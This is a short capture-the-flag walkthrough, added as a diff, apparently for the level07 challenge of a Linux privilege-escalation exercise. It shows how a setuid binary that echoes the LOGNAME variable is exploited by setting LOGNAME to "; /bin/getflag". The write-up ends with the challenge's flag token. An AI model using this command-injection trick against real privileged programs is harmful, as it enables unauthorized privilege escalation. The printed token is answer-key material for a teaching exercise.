@@ -1,0 +1,41 @@
+ll
+|
+L-> -rwsr-sr-x 1 flag07 [...] level07
+
+another executable launchable as the flag07 ?
+let's try to execute it
+
+./level07
+|
+L-> level07
+
+oh... ok, but why ?
+
+I first try to change the name of the executable but... no permission... of course
+let's try to get where does it take this string withhh.... strings
+
+strings level07
+|
+L-> [...]
+L-> LOGNAME
+L-> /bin/echo %s
+
+oh there it is, as we see we can't just edit the echo as before, but it take it from the env var LOGNAME
+so let's try to edit it simply
+
+export LOGNAME=test
+
+./level07
+|
+L-> test
+
+bingo! so now we can try to, as in a simple bash, put a ; then a getflag ! like this it will do an echo then a getflag as flag07 !
+
+export LOGNAME="; /bin/getflag"
+
+./level07
+|
+L-> 
+L-> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+as excepted we got the new line by echo, then the getflag :)
